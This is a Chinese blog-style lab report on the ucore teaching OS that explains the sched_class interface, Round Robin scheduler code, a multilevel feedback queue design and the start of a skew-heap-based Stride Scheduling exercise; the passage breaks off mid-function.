<p><img src="/images/loading.gif" data-original="/posts/48714bfd/image-20200501165749776.png" alt="image-20200501165749776"></p>
<p>执行priority.c失败</p>
<h3 id="回答问题"><a href="#回答问题" class="headerlink" title="回答问题"></a>回答问题</h3><blockquote>
<p>请理解并分析sched_class中各个函数指针的用法，并结合Round Robin 调度算法描ucore的调度执行过程</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">sched.h</span><br><span class="line"><span class="comment">// The introduction of scheduling classes is borrrowed from Linux, and makes the </span></span><br><span class="line"><span class="comment">// core scheduler quite extensible. These classes (the scheduler modules) encapsulate </span></span><br><span class="line"><span class="comment">// the scheduling policies. </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> &#123;</span></span><br><span class="line">    <span class="comment">// the name of sched_class</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="comment">// Init the run queue</span></span><br><span class="line">    <span class="keyword">void</span> (*init)(struct run_queue *rq);</span><br><span class="line">    <span class="comment">// put the proc into runqueue, and this function must be called with rq_lock</span></span><br><span class="line">    <span class="keyword">void</span> (*enqueue)(struct run_queue *rq, struct proc_struct *proc);</span><br><span class="line">    <span class="comment">// get the proc out runqueue, and this function must be called with rq_lock</span></span><br><span class="line">    <span class="keyword">void</span> (*dequeue)(struct run_queue *rq, struct proc_struct *proc);</span><br><span class="line">    <span class="comment">// choose the next runnable task</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *(*<span class="title">pick_next</span>)(<span class="title">struct</span> <span class="title">run_queue</span> *<span class="title">rq</span>);</span></span><br><span class="line">    <span class="comment">// dealer of the time-tick</span></span><br><span class="line">    <span class="keyword">void</span> (*proc_tick)(struct run_queue *rq, struct proc_struct *proc);</span><br><span class="line">    <span class="comment">/* for SMP support in the future</span></span><br><span class="line"><span class="comment">     *  load_balance</span></span><br><span class="line"><span class="comment">     *     void (*load_balance)(struct rq* rq);</span></span><br><span class="line"><span class="comment">     *  get some proc from this rq, used in load_balance,</span></span><br><span class="line"><span class="comment">     *  return value is the num of gotten proc</span></span><br><span class="line"><span class="comment">     *  int (*get_proc)(struct rq* rq, struct proc* procs_moved[]);</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>init</code> 函数指针用于初始化调度器</li>
<li><code>enqueue</code> 函数指针用于将一个进程放入调度队列中</li>
<li><code>dequeue</code> 函数指针用于将一个进程从调度队列中出队</li>
<li><code>pick_next</code> 函数指针用于从调度队列中根据算法选出下一个要被运行的进程</li>
<li><code>proc_tick</code> 函数指针用于系统时钟中断时通知调度器</li>
</ul>
<p>查看default_sched.c</p>
<p>使用RR调度算法</p>
<p><img src="/images/loading.gif" data-original="/posts/48714bfd/image-20200501201438761.png" alt="image-20200501201438761"></p>
<p>时间片轮转法（Round-Robin，RR）主要用于分时系统中的进程调度。为了实现轮转调度，系统把所有就绪进程按先入先出的原则排成一个队列。新来的进程加到就绪队列末尾。每当执行进程调度时，进程调度程序总是选出就绪队列的队首进程，让它在CPU上运行一个时间片的时间。时间片是一个小的时间单位，通常为10~100ms数量级。当进程用完分给它的时间片后，系统的计时器发出时钟中断，调度程序便停止该进程的运行，把它放入就绪队列的末尾；然后，把CPU分给就绪队列的队首进程，同样也让它运行一个时间片，如此往复。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">default_sched.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;defs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;proc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;default_sched.h&gt;</span></span></span><br><span class="line"><span class="comment">// 初始化算法所需要的数据结构</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">RR_init(struct run_queue *rq) &#123;</span><br><span class="line">    list_init(&amp;(rq-&gt;run_list));</span><br><span class="line">    rq-&gt;proc_num = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 进程入队 将进程加入就绪队列(不同的就绪队列的时间片不同 也就是说有不同优先级的就绪队列)</span></span><br><span class="line"><span class="comment"> 在 RR调度中 </span></span><br><span class="line"><span class="comment"> 当进程时间片为0 或 应某种情况被阻塞 则将其加入到就绪队列 并将其 时间片进行重置 */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">RR_enqueue(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line">    assert(list_empty(&amp;(proc-&gt;run_link)));</span><br><span class="line">    list_add_before(&amp;(rq-&gt;run_list), &amp;(proc-&gt;run_link));</span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span> || proc-&gt;time_slice &gt; rq-&gt;max_time_slice) &#123;</span><br><span class="line">        proc-&gt;time_slice = rq-&gt;max_time_slice;</span><br><span class="line">    &#125;</span><br><span class="line">    proc-&gt;rq = rq;</span><br><span class="line">    rq-&gt;proc_num ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 进程出队 将进程从就绪队列中删去</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">RR_dequeue(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line">    assert(!list_empty(&amp;(proc-&gt;run_link)) &amp;&amp; proc-&gt;rq == rq);</span><br><span class="line">    list_del_init(&amp;(proc-&gt;run_link));</span><br><span class="line">    rq-&gt;proc_num --;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 挑选出下一个进程 占用处理机去运行</span></span><br><span class="line"><span class="comment">   在 RR调度中 直接按照就绪队列的顺序轮询FCFS</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *</span></span><br><span class="line"><span class="class"><span class="title">RR_pick_next</span>(<span class="title">struct</span> <span class="title">run_queue</span> *<span class="title">rq</span>) &#123;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = list_next(&amp;(rq-&gt;run_list));</span><br><span class="line">    <span class="keyword">if</span> (le != &amp;(rq-&gt;run_list)) &#123;</span><br><span class="line">        <span class="keyword">return</span> le2proc(le, run_link);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 时钟中断时 调用此函数 在 RR调度中 每次调用都会减少当前进程时间片</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">RR_proc_tick(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        proc-&gt;time_slice --;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span>) &#123;</span><br><span class="line">        proc-&gt;need_resched = <span class="number">1</span>;<span class="comment">//直到 剩余时间片 为 0 当前进程的 need_resched 被置1 意为 需要被调度</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> <span class="title">default_sched_class</span> = &#123;</span></span><br><span class="line">    .name = <span class="string">"RR_scheduler"</span>,</span><br><span class="line">    .init = RR_init,</span><br><span class="line">    .enqueue = RR_enqueue,</span><br><span class="line">    .dequeue = RR_dequeue,</span><br><span class="line">    .pick_next = RR_pick_next,</span><br><span class="line">    .proc_tick = RR_proc_tick,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">./default_sched.h:<span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> <span class="title">default_sched_class</span>;</span></span><br><span class="line"></span><br><span class="line">sched.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sync.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;proc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;default_sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// the list of timer</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">list_entry_t</span> timer_list;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> *<span class="title">sched_class</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">run_queue</span> *<span class="title">rq</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span><br><span class="line">sched_class_enqueue(struct proc_struct *proc) &#123;<span class="comment">//入队列</span></span><br><span class="line">    <span class="keyword">if</span> (proc != idleproc) &#123;</span><br><span class="line">        sched_class-&gt;enqueue(rq, proc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span><br><span class="line">sched_class_dequeue(struct proc_struct *proc) &#123;<span class="comment">//出队列</span></span><br><span class="line">    sched_class-&gt;dequeue(rq, proc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *</span></span><br><span class="line"><span class="class"><span class="title">sched_class_pick_next</span>(<span class="title">void</span>) &#123;</span><span class="comment">//选择下一个要执行的进程时间片</span></span><br><span class="line">    <span class="keyword">return</span> sched_class-&gt;pick_next(rq);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">sched_class_proc_tick(struct proc_struct *proc) &#123;<span class="comment">//进程运行</span></span><br><span class="line">    <span class="keyword">if</span> (proc != idleproc) &#123;</span><br><span class="line">        sched_class-&gt;proc_tick(rq, proc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        proc-&gt;need_resched = <span class="number">1</span>;<span class="comment">//当前进程置1 需要被调度（0号进程被调度 不断遍历线程池 直达找到一个RUNNABLE状态的进程 调用进程切换来执行它)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">run_queue</span> __<span class="title">rq</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">sched_init(<span class="keyword">void</span>) &#123;<span class="comment">//初始化调度</span></span><br><span class="line">    list_init(&amp;timer_list);</span><br><span class="line"></span><br><span class="line">    sched_class = &amp;default_sched_class;</span><br><span class="line"></span><br><span class="line">    rq = &amp;__rq;</span><br><span class="line">    rq-&gt;max_time_slice = MAX_TIME_SLICE;</span><br><span class="line">    sched_class-&gt;init(rq);</span><br><span class="line"></span><br><span class="line">    cprintf(<span class="string">"sched class: %s\n"</span>, sched_class-&gt;name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">wakeup_proc(struct proc_struct *proc) &#123;<span class="comment">//唤醒进程</span></span><br><span class="line">    assert(proc-&gt;state != PROC_ZOMBIE);</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (proc-&gt;state != PROC_RUNNABLE) &#123;</span><br><span class="line">            proc-&gt;state = PROC_RUNNABLE;</span><br><span class="line">            proc-&gt;wait_state = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (proc != current) &#123;</span><br><span class="line">                sched_class_enqueue(proc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            warn(<span class="string">"wakeup runnable process.\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实现调度算法部分是一个原子操作</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">schedule(<span class="keyword">void</span>) &#123;<span class="comment">//调度函数</span></span><br><span class="line">    <span class="keyword">bool</span> intr_flag;<span class="comment">//定义中断变量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">next</span>;</span><span class="comment">//下一进程</span></span><br><span class="line">    local_intr_save(intr_flag);<span class="comment">//中断禁止函数</span></span><br><span class="line">    &#123;</span><br><span class="line">        current-&gt;need_resched = <span class="number">0</span>;<span class="comment">//设置当前进程不需要调度</span></span><br><span class="line">        <span class="keyword">if</span> (current-&gt;state == PROC_RUNNABLE) &#123;<span class="comment">//就绪态入队</span></span><br><span class="line">            sched_class_enqueue(current);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((next = sched_class_pick_next()) != <span class="literal">NULL</span>) &#123;<span class="comment">//如果队列非空则出队调度该进程</span></span><br><span class="line">            sched_class_dequeue(next);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (next == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            next = idleproc;<span class="comment">//未找到可以调度的进程 运行dileproc继续等待新进程</span></span><br><span class="line">        &#125;</span><br><span class="line">        next-&gt;runs ++;<span class="comment">//运行次数加一</span></span><br><span class="line">        <span class="keyword">if</span> (next != current) &#123;</span><br><span class="line">            proc_run(next);<span class="comment">//运行新进程,调用proc_run函数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);<span class="comment">//允许中断</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// add timer to timer_list</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">add_timer(<span class="keyword">timer_t</span> *timer) &#123;<span class="comment">//往定时器列表添加计时器</span></span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        assert(timer-&gt;expires &gt; <span class="number">0</span> &amp;&amp; timer-&gt;proc != <span class="literal">NULL</span>);</span><br><span class="line">        assert(list_empty(&amp;(timer-&gt;timer_link)));</span><br><span class="line">        <span class="keyword">list_entry_t</span> *le = list_next(&amp;timer_list);</span><br><span class="line">        <span class="keyword">while</span> (le != &amp;timer_list) &#123;</span><br><span class="line">            <span class="keyword">timer_t</span> *next = le2timer(le, timer_link);</span><br><span class="line">            <span class="keyword">if</span> (timer-&gt;expires &lt; next-&gt;expires) &#123;</span><br><span class="line">                next-&gt;expires -= timer-&gt;expires;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            timer-&gt;expires -= next-&gt;expires;</span><br><span class="line">            le = list_next(le);</span><br><span class="line">        &#125;</span><br><span class="line">        list_add_before(le, &amp;(timer-&gt;timer_link));</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// del timer from timer_list</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">del_timer(<span class="keyword">timer_t</span> *timer) &#123;<span class="comment">//删除定时器</span></span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!list_empty(&amp;(timer-&gt;timer_link))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (timer-&gt;expires != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">list_entry_t</span> *le = list_next(&amp;(timer-&gt;timer_link));</span><br><span class="line">                <span class="keyword">if</span> (le != &amp;timer_list) &#123;</span><br><span class="line">                    <span class="keyword">timer_t</span> *next = le2timer(le, timer_link);</span><br><span class="line">                    next-&gt;expires += timer-&gt;expires;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            list_del_init(&amp;(timer-&gt;timer_link));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// call scheduler to update tick related info, and check the timer is expired? If expired, then wakup proc</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">run_timer_list(<span class="keyword">void</span>) &#123;<span class="comment">//用循环实现计时器</span></span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">list_entry_t</span> *le = list_next(&amp;timer_list);</span><br><span class="line">        <span class="keyword">if</span> (le != &amp;timer_list) &#123;</span><br><span class="line">            <span class="keyword">timer_t</span> *timer = le2timer(le, timer_link);</span><br><span class="line">            assert(timer-&gt;expires != <span class="number">0</span>);</span><br><span class="line">            timer-&gt;expires --;</span><br><span class="line">            <span class="keyword">while</span> (timer-&gt;expires == <span class="number">0</span>) &#123;</span><br><span class="line">                le = list_next(le);</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> = <span class="title">timer</span>-&gt;<span class="title">proc</span>;</span></span><br><span class="line">                <span class="keyword">if</span> (proc-&gt;wait_state != <span class="number">0</span>) &#123;</span><br><span class="line">                    assert(proc-&gt;wait_state &amp; WT_INTERRUPTED);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    warn(<span class="string">"process %d's wait_state == 0.\n"</span>, proc-&gt;pid);</span><br><span class="line">                &#125;</span><br><span class="line">                wakeup_proc(proc);</span><br><span class="line">                del_timer(timer);</span><br><span class="line">                <span class="keyword">if</span> (le == &amp;timer_list) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                timer = le2timer(le, timer_link);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sched_class_proc_tick(current);</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/48714bfd/image-20200501200806757.png" alt="image-20200501200806757"></p>
<ul>
<li>设置当前进程剩余时间片</li>
<li>每次时钟中断 都将当前进程剩余时间片 -1</li>
<li>直到 剩余时间片 为 0 当前进程的 need_resched 被置1 意为 需要被调度</li>
<li>中断服务进程 一发现当前进程需要被调度 就 调用 schedule() 将它调度</li>
<li>会将当前进程 放入就绪队列中 并将其时间片设为<strong>当前队列的最大时间片</strong></li>
<li>接着调用 pick_next() 选择下一个需要换上处理机的进程 若选择成功 就让其 出就绪队列</li>
<li>若查找不到 则 内核线程 idle() 运行 该进程会死循环 不断查找可被调度的进程</li>
<li>最后调用 proc_run() 进行进程切换实现新进程的运行</li>
</ul>
<p>RR调度算法的就绪队列在组织结构上也是一个双向链表，只是增加了一个成员变量，表明在此就绪进程队列中的最大执行时间片。而且在进程控制块proc_struct中增加了一个成员变量time_slice，用来记录进程当前的可运行时间片段。这是由于RR调度算法需要考虑执行进程的运行时间不能太长。在每个timer到时的时候，操作系统会递减当前执行进程的time_slice，当time_slice为0时，就意味着这个进程运行了一段时间（这个时间片段称为进程的时间片），需要把CPU让给其他进程执行，于是操作系统就需要让此进程重新回到rq的队列尾，且重置此进程的时间片为就绪队列的成员变量最大时间片max_time_slice值，这表示如果进程在当前的执行时间片已经用完，需要等到下一次有机会运行时，才能再执行一段时间，然后再从rq的队列头取出一个新的进程执行。</p>
<blockquote>
<p>请在实验报告中简要说明如何设计实现“多级反馈队列调度算法”，给出概要设计，鼓励给出详细设计</p>
</blockquote>
<p><img src="/images/loading.gif" data-original="/posts/48714bfd/image-20200501222334313.png" alt="image-20200501222334313"></p>
<p>其与RR调度算法的区别的是对各进程的时间片大小进行了有规定过的量化</p>
<p>算法思想：</p>
<ol>
<li>时间片大小随优先级级别增加而增加</li>
<li>进程在当前时间片没有完成 则降到下一优先级</li>
<li>I/O密集型在高优先级 CPU密集型在低优先级</li>
</ol>
<p>算法说明</p>
<blockquote>
<p><img src="/images/loading.gif" data-original="/posts/48714bfd/2-1Q106162444303.gif" alt="多级反馈队列"></p>
<p>例如，一个多级反馈队列的调度程序有三个队列，从 0 到 2。调度程序首先执行队列 0 内的所有进程。只有当队列 0 为空时，它才能执行队列 1 内的进程。类似地，只有队列 0 和 1 都为空时，队列 2 的进程才能执行。到达队列 1 的进程会抢占队列 2 的进程。同样，到达队列 0 的进程会抢占队列 1 的进程。</p>
<p>每个进程在进入就绪队列后，就被添加到队列 0 内。队列 0 内的每个进程都有 8ms 的时间片。如果一个进程不能在这一时间片内完成，那么它就被移到队列 1 的尾部。如果队列 0 为空，队列 1 头部的进程会得到一个 16ms 的时间片。如果它不能完成，那么将被抢占，并添加到队列 2。只有当队列 0 和 1 为空时，队列 2 内的进程才可根据 <strong>FCFS</strong> 来运行。</p>
<p>这种调度算法将给那些 CPU 执行不超过 8ms 的进程最高优先级。这类进程可以很快得到 CPU，完成 CPU 执行，并且处理下个 I/O 执行。</p>
<p>所需超过 8ms 但不超过 24ms 的进程也会很快得以服务，但是它们的优先级要低一点。长进程会自动沉入队列 2，队列 0 和 1 不用的 CPU 周期按 FCFS 顺序来服务。</p>
</blockquote>
<p>算法实现：</p>
<ul>
<li><p>init<br>初始化算法维护的数据结构</p>
</li>
<li><p>enqueue<br>（所有进程一开始都进入高优先级队列）<br>如果当前进程的时间片计时器值为0(意味着该进程要么不能在相应时间片里运行结束，要么是新来的进程)</p>
<p>​         如果是新进程，将其入队到最高优先级队列，设置时间片为该优先级的最大值</p>
<p>​         否则将其从当前优先级队列复制入队到更低优先级队列，再将其从原队列dequeue，并且将当前时间片计数器值设置为原队列最大时间片大小的2倍，（等待下一次的调度）</p>
</li>
<li><p>dequeue<br>从相应优先级的队列中删去该进程</p>
</li>
<li><p>pick_next<br>从最高优先级队列中开始查找进程，若无则往更低的优先级队列继续查找，直到找到可运行的进程，并将其换上处理机去运行</p>
</li>
<li><p>proc_tick<br>时钟中断所使用 每次时钟中断 减少当前进程的时间片 若为0 则 将进程标记为需要调度 调用enqueue进行从新调度</p>
</li>
</ul>
<h2 id="练习2-实现-Stride-Scheduling-调度算法"><a href="#练习2-实现-Stride-Scheduling-调度算法" class="headerlink" title="练习2: 实现 Stride Scheduling 调度算法"></a>练习2: 实现 Stride Scheduling 调度算法</h2><p>首先需要换掉RR调度器的实现，即用default_sched_stride_c覆盖default_sched.c。然后根据此文件和后续文档对Stride度器的相关描述，完成Stride调度算法的实现。</p>
<p>后面的实验文档部分给出了Stride调度算法的大体描述。这里给出Stride调度算法的一些相关的资料（目前网上中文的资料比较欠缺）。</p>
<ul>
<li><a href="http://wwwagss.informatik.uni-kl.de/Projekte/Squirrel/stride/node3.html">strid-shed paper location1</a></li>
<li><a href="http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.138.3502&amp;rank=1">strid-shed paper location2</a></li>
<li>也可GOOGLE “Stride Scheduling” 来查找相关资料</li>
</ul>
<p>执行：make grade。如果所显示的应用程序检测都输出ok，则基本正确。如果只是priority.c过不去，可执行 make run-priority 命令来单独调试它。大致执行结果可看附录。（ 使用的是 qemu-1.0.1 ）。</p>
<p>请在实验报告中简要说明你的设计实现过程。</p>
<p>使用斜堆数据结构</p>
<h3 id="实验过程-1"><a href="#实验过程-1" class="headerlink" title="实验过程"></a>实验过程</h3><p>首先，根据的要求覆盖掉Round Robin调度算法。 覆盖掉之后需要在该框架上实现Stride Scheduling调度算法。   </p>
<ul>
<li>1、为每个RUNNABLE的进程设置一个当前状态stride，表示该进程当前的调度权。另外定义其对应的pass值，表示对应进程在调度后，stride 需要进行的累加值。</li>
<li>2、 每次需要调度时，从当前 runnable 态的进程中选择 stride最小的进程调度。对于获得调度的进程P，将对应的stride加上其对应的步长pass（只与进程的优先权有关系）。 </li>
<li>3、在一段固定的时间之后，回到步骤2，重新调度当前stride最小的进程</li>
</ul>
<p>由于算法涉及到每次取出当前stride最小的进程，用优先队列(斜堆)存放各进程的stride，降低算法时间复杂度。</p>
<p><strong>斜堆数据结构 </strong>:</p>
<p>libs/skew_heap.h</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __LIBS_SKEW_HEAP_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __LIBS_SKEW_HEAP_H__</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skew_heap_entry</span> &#123;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">skew_heap_entry</span> *<span class="title">parent</span>, *<span class="title">left</span>, *<span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">skew_heap_entry</span> <span class="title">skew_heap_entry_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(*compare_f)</span><span class="params">(<span class="keyword">void</span> *a, <span class="keyword">void</span> *b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">skew_heap_init</span><span class="params">(<span class="keyword">skew_heap_entry_t</span> *a)</span> __<span class="title">attribute__</span><span class="params">((always_inline))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> skew_heap_entry_t *<span class="title">skew_heap_merge</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">skew_heap_entry_t</span> *a, <span class="keyword">skew_heap_entry_t</span> *b,</span></span></span><br><span class="line"><span class="function"><span class="params">     compare_f comp)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> skew_heap_entry_t *<span class="title">skew_heap_insert</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">skew_heap_entry_t</span> *a, <span class="keyword">skew_heap_entry_t</span> *b,</span></span></span><br><span class="line"><span class="function"><span class="params">     compare_f comp)</span> __<span class="title">attribute__</span><span class="params">((always_inline))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> skew_heap_entry_t *<span class="title">skew_heap_remove</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">skew_heap_entry_t</span> *a, <span class="keyword">skew_heap_entry_t</span> *b,</span></span></span><br><span class="line"><span class="function"><span class="params">     compare_f comp)</span> __<span class="title">attribute__</span><span class="params">((always_inline))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span><br><span class="line">skew_heap_init(<span class="keyword">skew_heap_entry_t</span> *a)</span><br><span class="line">&#123;</span><br><span class="line">     a-&gt;left = a-&gt;right = a-&gt;parent = <span class="literal">NULL</span>;<span class="comment">//初始化根节点</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">skew_heap_entry_t</span> *</span><br><span class="line">skew_heap_merge(<span class="keyword">skew_heap_entry_t</span> *a, <span class="keyword">skew_heap_entry_t</span> *b,</span><br><span class="line">                compare_f comp)</span><br><span class="line">&#123;<span class="comment">//合并两个斜堆</span></span><br><span class="line">     <span class="keyword">if</span> (a == <span class="literal">NULL</span>) <span class="keyword">return</span> b;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="literal">NULL</span>) <span class="keyword">return</span> a;</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">skew_heap_entry_t</span> *l, *r;</span><br><span class="line">     <span class="keyword">if</span> (comp(a, b) == <span class="number">-1</span>)</span><br><span class="line">     &#123;</span><br><span class="line">          r = a-&gt;left;</span><br><span class="line">          l = skew_heap_merge(a-&gt;right, b, comp);</span><br><span class="line">          </span><br><span class="line">          